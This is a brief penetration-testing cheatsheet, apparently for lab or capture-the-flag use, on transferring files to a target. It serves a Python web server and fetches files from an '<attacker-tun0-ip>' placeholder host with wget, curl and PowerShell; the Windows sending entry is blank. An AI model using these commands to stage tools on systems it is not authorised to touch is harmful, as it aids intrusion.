#cheatsheet
## Transferring End
**Linux**
`cd /path/to/file`
`python3 -m http.server <port>`

**Windows**
?

## Receiving End
**Linux**
`wget http://<attacker-tun0-ip>:<port>/<filename> -O /tmp/<filename>`
*OR*
`curl http://<attacker-tun0-ip>:<port>/<filename> -o /tmp/<filename>`

**Windows**
`powershell -c "Invoke-WebRequest -Uri 'http://<attacker-tun0-ip>:<port>/<filename>' -OutFile 'C:\windows\temp\<filename>'"`
*OR*
`Invoke-WebRequest -Uri 'http://<attacker-tun0-ip>:<port>/<filename>' -OutFile 'C:\windows\temp\<filename>'`

